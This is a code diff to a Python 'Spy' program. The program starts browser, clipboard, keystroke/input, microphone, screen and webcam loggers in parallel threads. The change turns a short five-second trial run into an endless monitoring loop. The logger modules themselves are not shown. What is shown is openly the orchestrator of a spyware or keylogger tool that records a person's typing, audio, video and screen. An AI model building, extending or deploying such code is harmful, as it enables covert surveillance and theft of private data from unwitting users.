@@ -1,26 +1,35 @@
 from threading import Thread
-
+from time import sleep
 from loggers.browser_logger import BrowserLogger
 from loggers.clipboard_logger import ClipboardLogger
 from loggers.input_logger import InputLogger
 from loggers.microphone_logger import MicrophoneLogger
 from loggers.screen_logger import ScreenLogger
 from loggers.webcam_logger import WebcamLogger
-
 from utils.utils import create_log_directories
 from config import LOGS_DIRECTORY_PATH
-
 
 class Spy:
     def __init__(self):
         self.logs_directory_path = LOGS_DIRECTORY_PATH if LOGS_DIRECTORY_PATH else ""
         self.loggers = []
-        self.running_threads = []
+        self.threads = []
+
+    def start_all(self):
+        for thread in self.threads:
+            thread.start()
 
     def stop_all(self):
+        print("Stopping threads. This might take a minute.")
         for logger in self.loggers:
-            print("Stopped?")
             logger.running = False
+            print(f"Logger {logger} stopped running..")
+        for thread in self.threads:
+            thread.join()
+            print(f"Thread {thread.name} joined.")
+    
+    def check_threads(self):
+        self.threads = [thread for thread in self.threads if thread.is_alive()]
 
     def spy(self):
         create_log_directories(self.logs_directory_path)
@@ -40,15 +49,15 @@ class Spy:
             screen_logger,
             webcam_logger
         ])
+        
+        browser_thread = Thread(target=browser_logger.run, name="browser")
+        clipboard_thread = Thread(target=clipboard_logger.run, name="clipboard")
+        input_thread = Thread(target=input_logger.run, name="input")
+        microphone_thread = Thread(target=microphone_logger.run, name="microphone")
+        screen_thread = Thread(target=screen_logger.run, name="screen")
+        webcam_thread = Thread(target=webcam_logger.run, name="webcam")
 
-        browser_thread = Thread(target=browser_logger.run)
-        clipboard_thread = Thread(target=clipboard_logger.run)
-        input_thread = Thread(target=input_logger.run)
-        microphone_thread = Thread(target=microphone_logger.run)
-        screen_thread = Thread(target=screen_logger.run)
-        webcam_thread = Thread(target=webcam_logger.run)
-
-        self.running_threads.extend([
+        self.threads.extend([
             browser_thread,
             clipboard_thread,
             input_thread,
@@ -57,16 +66,14 @@ class Spy:
             webcam_thread,
         ])
 
-        for thread in self.running_threads:
-            thread.start()
+        self.start_all()
 
-        from time import sleep
-        sleep(5)
-        self.stop_all()
-
-        for thread in self.running_threads:
-            thread.join()
-
+        while True:
+            sleep(5)
+            self.check_threads()
+            print("Currently running threads:")
+            for thread in self.threads:
+                print(thread.name)
 
 if __name__ == "__main__":
     spy = Spy()
